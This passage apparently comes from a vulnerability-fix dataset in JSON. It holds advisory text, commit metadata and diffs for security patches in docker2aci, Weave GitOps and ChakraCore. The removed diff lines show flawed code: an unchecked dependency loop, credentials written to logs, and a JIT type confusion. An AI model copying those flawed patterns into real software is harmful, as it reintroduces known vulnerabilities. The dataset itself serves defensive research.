            "commit_href":"https:\/\/github.com\/appc\/docker2aci\/pull\/204\/commits\/54331ec7020e102935c31096f336d31f6400064f",
            "commit_sha":"54331ec7020e102935c31096f336d31f6400064f",
            "patch":"SINGLE",
            "chain_ord":"['54331ec7020e102935c31096f336d31f6400064f']",
            "before_first_fix_commit":"{'8a4173c3067a557fba64a03c6efac613dfbba6ac'}",
            "last_fix_commit":"54331ec7020e102935c31096f336d31f6400064f",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/10\/2016, 13:23:55",
            "message":"backend\/file: fix an infinite loop in deps walking (CVE-2016-8579)\n\nThis commit fixes a possible infinite loop while traversing\nthe dependency ancestry of a malformed local image file.\n\nThis has been assigned CVE-2016-8579:\nhttps:\/\/github.com\/appc\/docker2aci\/issues\/203#issuecomment-253494006",
            "author":"Luca Bruno",
            "comments":null,
            "stats":"{'additions': 11, 'deletions': 0, 'total': 11}",
            "files":"{'lib\/internal\/backend\/file\/file.go': {'additions': 11, 'deletions': 0, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/appc\/docker2aci\/raw\/54331ec7020e102935c31096f336d31f6400064f\/lib%2Finternal%2Fbackend%2Ffile%2Ffile.go', 'patch': '@@ -279,14 +279,24 @@ func extractEmbeddedLayer(file *os.File, layerID string, outputPath string) (*os\\n \\treturn layerFile, nil\\n }\\n \\n+\/\/ getAncestry computes an image ancestry, returning an ordered list\\n+\/\/ of dependencies starting from the topmost image to the base.\\n+\/\/ It checks for dependency loops via duplicate detection in the image\\n+\/\/ chain and errors out in such cases.\\n func getAncestry(file *os.File, imgID string) ([]string, error) {\\n \\tvar ancestry []string\\n+\\tdeps := make(map[string]bool)\\n \\n \\tcurImgID := imgID\\n \\n \\tvar err error\\n \\tfor curImgID != \"\" {\\n+\\t\\tif deps[curImgID] {\\n+\\t\\t\\treturn nil, fmt.Errorf(\"dependency loop detected at image %q\", curImgID)\\n+\\t\\t}\\n+\\t\\tdeps[curImgID] = true\\n \\t\\tancestry = append(ancestry, curImgID)\\n+\\t\\tlog.Debug(fmt.Sprintf(\"Getting ancestry for layer %q\", curImgID))\\n \\t\\tcurImgID, err = getParent(file, curImgID)\\n \\t\\tif err != nil {\\n \\t\\t\\treturn nil, err\\n@@ -328,5 +338,6 @@ func getParent(file *os.File, imgID string) (string, error) {\\n \\t\\treturn \"\", err\\n \\t}\\n \\n+\\tlog.Debug(fmt.Sprintf(\"Layer %q depends on layer %q\", imgID, parent))\\n \\treturn parent, nil\\n }'}}",
            "message_norm":"backend\/file: fix an infinite loop in deps walking (cve-2016-8579)\n\nthis commit fixes a possible infinite loop while traversing\nthe dependency ancestry of a malformed local image file.\n\nthis has been assigned cve-2016-8579:\nhttps:\/\/github.com\/appc\/docker2aci\/issues\/203#issuecomment-253494006",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('infinite loop', 'SECWORD', ''), ('cve-2016-8579', 'VULNID', 'CVE'), ('fixes', 'ACTION', ''), ('infinite loop', 'SECWORD', ''), ('cve-2016-8579', 'VULNID', 'CVE'), ('https:\/\/github.com\/appc\/docker2aci\/issues\/203#issuecomment-253494006', 'URL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/internal\/backend\/file\/file.go'])",
            "num_files":1.0,
            "patch_content":"From 54331ec7020e102935c31096f336d31f6400064f Mon Sep 17 00:00:00 2001\nFrom: Luca Bruno <lucab@debian.org>\nDate: Mon, 10 Oct 2016 13:23:55 +0000\nSubject: [PATCH] backend\/file: fix an infinite loop in deps walking\n (CVE-2016-8579)\n\nThis commit fixes a possible infinite loop while traversing\nthe dependency ancestry of a malformed local image file.\n\nThis has been assigned CVE-2016-8579:\nhttps:\/\/github.com\/appc\/docker2aci\/issues\/203#issuecomment-253494006\n---\n lib\/internal\/backend\/file\/file.go | 11 +++++++++++\n 1 file changed, 11 insertions(+)\n\ndiff --git a\/lib\/internal\/backend\/file\/file.go b\/lib\/internal\/backend\/file\/file.go\nindex a83402df..d89cc937 100644\n--- a\/lib\/internal\/backend\/file\/file.go\n+++ b\/lib\/internal\/backend\/file\/file.go\n@@ -279,14 +279,24 @@ func extractEmbeddedLayer(file *os.File, layerID string, outputPath string) (*os\n \treturn layerFile, nil\n }\n \n+\/\/ getAncestry computes an image ancestry, returning an ordered list\n+\/\/ of dependencies starting from the topmost image to the base.\n+\/\/ It checks for dependency loops via duplicate detection in the image\n+\/\/ chain and errors out in such cases.\n func getAncestry(file *os.File, imgID string) ([]string, error) {\n \tvar ancestry []string\n+\tdeps := make(map[string]bool)\n \n \tcurImgID := imgID\n \n \tvar err error\n \tfor curImgID != \"\" {\n+\t\tif deps[curImgID] {\n+\t\t\treturn nil, fmt.Errorf(\"dependency loop detected at image %q\", curImgID)\n+\t\t}\n+\t\tdeps[curImgID] = true\n \t\tancestry = append(ancestry, curImgID)\n+\t\tlog.Debug(fmt.Sprintf(\"Getting ancestry for layer %q\", curImgID))\n \t\tcurImgID, err = getParent(file, curImgID)\n \t\tif err != nil {\n \t\t\treturn nil, err\n@@ -328,5 +338,6 @@ func getParent(file *os.File, imgID string) (string, error) {\n \t\treturn \"\", err\n \t}\n \n+\tlog.Debug(fmt.Sprintf(\"Layer %q depends on layer %q\", imgID, parent))\n \treturn parent, nil\n }",
            "code_diff":"@@ -279,14 +279,24 @@ func extractEmbeddedLayer(file *os.File, layerID string, outputPath string) (*os\n \treturn layerFile, nil\n }\n \n+\/\/ getAncestry computes an image ancestry, returning an ordered list\n+\/\/ of dependencies starting from the topmost image to the base.\n+\/\/ It checks for dependency loops via duplicate detection in the image\n+\/\/ chain and errors out in such cases.\n func getAncestry(file *os.File, imgID string) ([]string, error) {\n \tvar ancestry []string\n+\tdeps := make(map[string]bool)\n \n \tcurImgID := imgID\n \n \tvar err error\n \tfor curImgID != \"\" {\n+\t\tif deps[curImgID] {\n+\t\t\treturn nil, fmt.Errorf(\"dependency loop detected at image %q\", curImgID)\n+\t\t}\n+\t\tdeps[curImgID] = true\n \t\tancestry = append(ancestry, curImgID)\n+\t\tlog.Debug(fmt.Sprintf(\"Getting ancestry for layer %q\", curImgID))\n \t\tcurImgID, err = getParent(file, curImgID)\n \t\tif err != nil {\n \t\t\treturn nil, err\n@@ -328,5 +338,6 @@ func getParent(file *os.File, imgID string) (string, error) {\n \t\treturn \"\", err\n \t}\n \n+\tlog.Debug(fmt.Sprintf(\"Layer %q depends on layer %q\", imgID, parent))\n \treturn parent, nil\n }"
        },
        {
            "index":480,
            "vuln_id":"GHSA-xggc-qprg-x6mw",
            "cwe_id":"{'CWE-532', 'CWE-209', 'CWE-538', 'CWE-200'}",
            "score":9.0,
            "chain":"{'https:\/\/github.com\/weaveworks\/weave-gitops\/commit\/567356f471353fb5c676c77f5abc2a04631d50ca'}",
            "dataset":"osv",
            "summary":"Weave GitOps leaked cluster credentials into logs on connection errors ### Impact\nA vulnerability in the logging of Weave GitOps could allow an authenticated remote attacker to view sensitive cluster configurations, aka KubeConfg, of registered Kubernetes clusters, including the service account tokens in plain text from Weave GitOps's pod logs on the management cluster. An unauthorized remote attacker can also view these sensitive configurations from external log storage if enabled by the management cluster.\n\nThis vulnerability is due to the client factory dumping cluster configurations and their service account tokens when the cluster manager tries to connect to an API server of a registered cluster, and a connection error occurs. An attacker could exploit this vulnerability by either accessing logs of a pod of Weave GitOps, or from external log storage and obtaining all cluster configurations of registered clusters.\n\nA successful exploit could allow the attacker to use those cluster configurations to manage the registered Kubernetes clusters.\n\n### Patches\nThis vulnerability has been fixed by commit 567356f471353fb5c676c77f5abc2a04631d50ca. Users should upgrade to Weave GitOps core version >= v0.8.1-rc.6 released on 31\/05\/2022.\n\n### Workarounds\nThere is no workaround for this vulnerability.\n\n### References\nDisclosed by Stefan Prodan, Principal Engineer, Weaveworks.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Weave GitOps repository](https:\/\/github.com\/weaveworks\/weave-gitops)\n* Email us at [support@weave.works](mailto:support@weave.works)",
            "published_date":"2022-06-23",
            "chain_len":1,
            "project":"https:\/\/github.com\/weaveworks\/weave-gitops",
            "commit_href":"https:\/\/github.com\/weaveworks\/weave-gitops\/commit\/567356f471353fb5c676c77f5abc2a04631d50ca",
            "commit_sha":"567356f471353fb5c676c77f5abc2a04631d50ca",
            "patch":"SINGLE",
            "chain_ord":"['567356f471353fb5c676c77f5abc2a04631d50ca']",
            "before_first_fix_commit":"{'a80bb361901d2e0e8f0e675303dfc3cbfcc9ab92'}",
            "last_fix_commit":"567356f471353fb5c676c77f5abc2a04631d50ca",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/28\/2022, 12:43:50",
            "message":"Fix logging on cluster connection error\nRemove the client config from the error log since the wrapped error already contains the cluster name for which the connection couldn't be established.\n\nSigned-off-by: Stefan Prodan <stefan.prodan@gmail.com>",
            "author":"Stefan Prodan",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'core\/clustersmngr\/factory.go': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/weaveworks\/weave-gitops\/raw\/567356f471353fb5c676c77f5abc2a04631d50ca\/core%2Fclustersmngr%2Ffactory.go', 'patch': '@@ -131,7 +131,7 @@ func (cf *clientsFactory) watchNamespaces(ctx context.Context) {\\n func (cf *clientsFactory) UpdateNamespaces(ctx context.Context) error {\\n \\tclients, err := clientsForClusters(cf.clusters.Get())\\n \\tif err != nil {\\n-\\t\\tcf.log.Error(err, \"failed to create clients for\", \"clusters\", cf.clusters.Get())\\n+\\t\\tcf.log.Error(err, \"failed to create client\")\\n \\t\\treturn err\\n \\t}'}}",
            "message_norm":"fix logging on cluster connection error\nremove the client config from the error log since the wrapped error already contains the cluster name for which the connection couldn't be established.\n\nsigned-off-by: stefan prodan <stefan.prodan@gmail.com>",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('error', 'FLAW', ''), ('remove', 'ACTION', ''), ('error', 'FLAW', ''), ('error', 'FLAW', ''), ('stefan.prodan@gmail.com', 'EMAIL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['core\/clustersmngr\/factory.go'])",
            "num_files":1.0,
            "patch_content":"From 567356f471353fb5c676c77f5abc2a04631d50ca Mon Sep 17 00:00:00 2001\nFrom: Stefan Prodan <stefan.prodan@gmail.com>\nDate: Sat, 28 May 2022 15:43:50 +0300\nSubject: [PATCH] Fix logging on cluster connection error Remove the client\n config from the error log since the wrapped error already contains the\n cluster name for which the connection couldn't be established.\n\nSigned-off-by: Stefan Prodan <stefan.prodan@gmail.com>\n---\n core\/clustersmngr\/factory.go | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/core\/clustersmngr\/factory.go b\/core\/clustersmngr\/factory.go\nindex 513eda5996..b7bc2c84d8 100644\n--- a\/core\/clustersmngr\/factory.go\n+++ b\/core\/clustersmngr\/factory.go\n@@ -131,7 +131,7 @@ func (cf *clientsFactory) watchNamespaces(ctx context.Context) {\n func (cf *clientsFactory) UpdateNamespaces(ctx context.Context) error {\n \tclients, err := clientsForClusters(cf.clusters.Get())\n \tif err != nil {\n-\t\tcf.log.Error(err, \"failed to create clients for\", \"clusters\", cf.clusters.Get())\n+\t\tcf.log.Error(err, \"failed to create client\")\n \t\treturn err\n \t}",
            "code_diff":"@@ -131,7 +131,7 @@ func (cf *clientsFactory) watchNamespaces(ctx context.Context) {\n func (cf *clientsFactory) UpdateNamespaces(ctx context.Context) error {\n \tclients, err := clientsForClusters(cf.clusters.Get())\n \tif err != nil {\n-\t\tcf.log.Error(err, \"failed to create clients for\", \"clusters\", cf.clusters.Get())\n+\t\tcf.log.Error(err, \"failed to create client\")\n \t\treturn err\n \t}"
        },
        {
            "index":495,
            "vuln_id":"GHSA-rh4p-g7x6-8pqg",
            "cwe_id":"{'CWE-787'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/75162b7f2d8ac2b37d17564e9c979ba1bae707e8', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7f0d390ad77d838cbb81d4586c83ec822f384ce8'}",
            "dataset":"osv",
            "summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1092, CVE-2019-1103, CVE-2019-1106, CVE-2019-1107.",
            "published_date":"2021-03-29",
            "chain_len":2,
            "project":"https:\/\/github.com\/chakra-core\/ChakraCore",
            "commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7f0d390ad77d838cbb81d4586c83ec822f384ce8",
            "commit_sha":"7f0d390ad77d838cbb81d4586c83ec822f384ce8",
            "patch":"MULTI",
            "chain_ord":"['7f0d390ad77d838cbb81d4586c83ec822f384ce8', '75162b7f2d8ac2b37d17564e9c979ba1bae707e8']",
            "before_first_fix_commit":"{'12c31f0e83ddc511e57b9aa1e78533899199eb32', 'ba1f4455f921ce5f12091ff8a11c8028c6a64b17'}",
            "last_fix_commit":"75162b7f2d8ac2b37d17564e9c979ba1bae707e8",
            "chain_ord_pos":1.0,
            "commit_datetime":"06\/06\/2019, 18:38:26",
            "message":"[CVE-2019-1062] Chakra JIT Type Confusion",
            "author":"Paul Leathers",
            "comments":null,
            "stats":"{'additions': 5, 'deletions': 6, 'total': 11}",
            "files":"{'lib\/Backend\/Opnd.cpp': {'additions': 5, 'deletions': 6, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/7f0d390ad77d838cbb81d4586c83ec822f384ce8\/lib%2FBackend%2FOpnd.cpp', 'patch': \"@@ -962,7 +962,8 @@ PropertySymOpnd::IsObjectHeaderInlined() const\\n bool\\n PropertySymOpnd::ChangesObjectLayout() const\\n {\\n-    JITTypeHolder cachedType = this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\\n+    JITTypeHolder cachedType = this->HasInitialType() ? this->GetInitialType() : \\n+        this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\\n \\n     JITTypeHolder finalType = this->GetFinalType();\\n \\n@@ -987,13 +988,11 @@ PropertySymOpnd::ChangesObjectLayout() const\\n         \/\/ This is the case where the type transition actually occurs. (This is the only case that's detectable\\n         \/\/ during the loop pre-pass, since final types are not in place yet.)\\n \\n-        Assert(cachedType != nullptr && Js::DynamicType::Is(cachedType->GetTypeId()));\\n-\\n-        const JITTypeHandler * cachedTypeHandler = cachedType->GetTypeHandler();\\n         const JITTypeHandler * initialTypeHandler = initialType->GetTypeHandler();\\n \\n-        return cachedTypeHandler->GetInlineSlotCapacity() != initialTypeHandler->GetInlineSlotCapacity() ||\\n-            cachedTypeHandler->GetOffsetOfInlineSlots() != initialTypeHandler->GetOffsetOfInlineSlots();\\n+        \/\/ If no final type has been set in the forward pass, then we have no way of knowing how the object shape will evolve here.\\n+        \/\/ If the initial type is object-header-inlined, assume that the layout may change.\\n+        return initialTypeHandler->IsObjectHeaderInlinedTypeHandler();\\n     }\\n \\n     return false;\"}}",
            "message_norm":"[cve-2019-1062] chakra jit type confusion",
            "language":"en",
            "entities":"[('cve-2019-1062', 'VULNID', 'CVE'), ('type confusion', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/Backend\/Opnd.cpp'])",
            "num_files":1.0,
            "patch_content":"From 7f0d390ad77d838cbb81d4586c83ec822f384ce8 Mon Sep 17 00:00:00 2001\nFrom: Paul Leathers <pleath@microsoft.com>\nDate: Thu, 6 Jun 2019 11:38:26 -0700\nSubject: [PATCH] [CVE-2019-1062] Chakra JIT Type Confusion\n\n---\n lib\/Backend\/Opnd.cpp | 11 +++++------\n 1 file changed, 5 insertions(+), 6 deletions(-)\n\ndiff --git a\/lib\/Backend\/Opnd.cpp b\/lib\/Backend\/Opnd.cpp\nindex d9243e86299..35594cade16 100644\n--- a\/lib\/Backend\/Opnd.cpp\n+++ b\/lib\/Backend\/Opnd.cpp\n@@ -962,7 +962,8 @@ PropertySymOpnd::IsObjectHeaderInlined() const\n bool\n PropertySymOpnd::ChangesObjectLayout() const\n {\n-    JITTypeHolder cachedType = this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\n+    JITTypeHolder cachedType = this->HasInitialType() ? this->GetInitialType() : \n+        this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\n \n     JITTypeHolder finalType = this->GetFinalType();\n \n@@ -987,13 +988,11 @@ PropertySymOpnd::ChangesObjectLayout() const\n         \/\/ This is the case where the type transition actually occurs. (This is the only case that's detectable\n         \/\/ during the loop pre-pass, since final types are not in place yet.)\n \n-        Assert(cachedType != nullptr && Js::DynamicType::Is(cachedType->GetTypeId()));\n-\n-        const JITTypeHandler * cachedTypeHandler = cachedType->GetTypeHandler();\n         const JITTypeHandler * initialTypeHandler = initialType->GetTypeHandler();\n \n-        return cachedTypeHandler->GetInlineSlotCapacity() != initialTypeHandler->GetInlineSlotCapacity() ||\n-            cachedTypeHandler->GetOffsetOfInlineSlots() != initialTypeHandler->GetOffsetOfInlineSlots();\n+        \/\/ If no final type has been set in the forward pass, then we have no way of knowing how the object shape will evolve here.\n+        \/\/ If the initial type is object-header-inlined, assume that the layout may change.\n+        return initialTypeHandler->IsObjectHeaderInlinedTypeHandler();\n     }\n \n     return false;",
            "code_diff":"@@ -962,7 +962,8 @@ PropertySymOpnd::IsObjectHeaderInlined() const\n bool\n PropertySymOpnd::ChangesObjectLayout() const\n {\n-    JITTypeHolder cachedType = this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\n+    JITTypeHolder cachedType = this->HasInitialType() ? this->GetInitialType() : \n+        this->IsMono() ? this->GetType() : this->GetFirstEquivalentType();\n \n     JITTypeHolder finalType = this->GetFinalType();\n \n@@ -987,13 +988,11 @@ PropertySymOpnd::ChangesObjectLayout() const\n         \/\/ This is the case where the type transition actually occurs. (This is the only case that's detectable\n         \/\/ during the loop pre-pass, since final types are not in place yet.)\n \n-        Assert(cachedType != nullptr && Js::DynamicType::Is(cachedType->GetTypeId()));\n-\n-        const JITTypeHandler * cachedTypeHandler = cachedType->GetTypeHandler();\n         const JITTypeHandler * initialTypeHandler = initialType->GetTypeHandler();\n \n-        return cachedTypeHandler->GetInlineSlotCapacity() != initialTypeHandler->GetInlineSlotCapacity() ||\n-            cachedTypeHandler->GetOffsetOfInlineSlots() != initialTypeHandler->GetOffsetOfInlineSlots();\n+        \/\/ If no final type has been set in the forward pass, then we have no way of knowing how the object shape will evolve here.\n+        \/\/ If the initial type is object-header-inlined, assume that the layout may change.\n+        return initialTypeHandler->IsObjectHeaderInlinedTypeHandler();\n     }\n \n     return false;"
        }
    ]
}